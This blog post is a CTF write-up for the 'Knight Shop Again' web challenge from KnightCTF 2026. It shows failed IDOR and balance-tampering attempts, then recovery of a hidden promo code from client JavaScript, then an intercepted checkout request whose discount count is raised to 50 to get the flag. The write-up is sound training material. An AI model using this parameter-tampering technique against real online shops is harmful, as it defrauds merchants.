---
layout: post
title:  "Knight Shop Again"
date:   2026-01-21 15:54:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /knightctf-2026-knight-shop-again/
---

**Title**: Knight Shop Again

**Author**: TareqAhamed

**Category**: Web

**Description**: A modern e-commerce platform for medieval equipment. I know you'll figure it out.[http://23.239.26.112:8087/](http://23.239.26.112:8087/)

**Flag Format: KCTF{Fl4g_heR3}**

I go to the site and register an account. When making an account you are given $50 in credit:

![Alt text](/images/Knight Shop-Premium-Medieval-Equipment.png)

I change this number when intercepting traffic but your balance does not change on the backend and you will always have insufficient funds. I guess it was worth trying:

![Alt text](/images/MONEY-PLS-Knight Shop-Premium-Medieval-Equipment.png)

I tried exploiting an IDOR in `/api/products/1` by going up to `61` but I find no unlisted products:
```shell
curl http://23.239.26.112:8087/api/products/60  
{"id":60,"name":"Legendary Excalibur","description":"The sword of legends - contains ancient secrets","price":199.99,"image":"/images/excalibur.svg","stock":100}

curl http://23.239.26.112:8087/api/products/61  
{"error":"Product not found"}
```

In the javascript at `view-source:http://23.239.26.112:8087/static/js/main.b42977dd.js` I find this code which reveals a discount code:
```javascript
function $e(e){
    const t=function(e){
        const t=[75,78,73,71,72,84],n=[50,53];
        if(!e||e.length<5)return{valid:!1};
        const r=e.substring(0,6),a=e.substring(6);
        let l=!0;
        for(let o=0;o<6;o++)if(r.charCodeAt(o)!==t[o]){l=!1;break}
        if(l&&2===a.length&&a.charCodeAt(0)===n[0]&&a.charCodeAt(1)===n[1]){
            const t="promo_applied";
            return document.cookie.split(";").find(e=>e.trim().startsWith(t+"="))?{valid:!1}:(document.cookie=t+"=1; path=/",{valid:!0,code:e})
        }
        return{valid:!1}
    }(e);
    return t
}
```
This decodes to `KNIGHT25` and will give 25% off a product.

I intercept the request to `/api/checkout` after applying the code and I change the discount count number from `1` to `50`.

Request:
```http
POST /api/checkout HTTP/1.1
Host: 23.239.26.112:8087
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://23.239.26.112:8087/cart
Content-Type: application/json
Content-Length: 37
Origin: http://23.239.26.112:8087
DNT: 1
Connection: keep-alive
Cookie: connect.sid=s%3AeBhsgJSDlKx7w90KWTExci5Ge5Vdrj4b.WJWZAVVv7Q3VJHrZnq4ia1qNthrbTngkfEMVaKpfcac; promo_applied=1
Priority: u=0

{"discountCode":"KNIGHT25","discountCount":50}
```

Response:
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 101
ETag: W/"65-fvqhL6QeErVZwebaFcBcJsVKa5E"
Date: Wed, 21 Jan 2026 07:36:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"success":true,"balance":49.999886741331935,"total":"0.00","flag":"KCTF{kn1ght_c0up0n_m4st3r_2026}"}
```

`KCTF{kn1ght_c0up0n_m4st3r_2026}`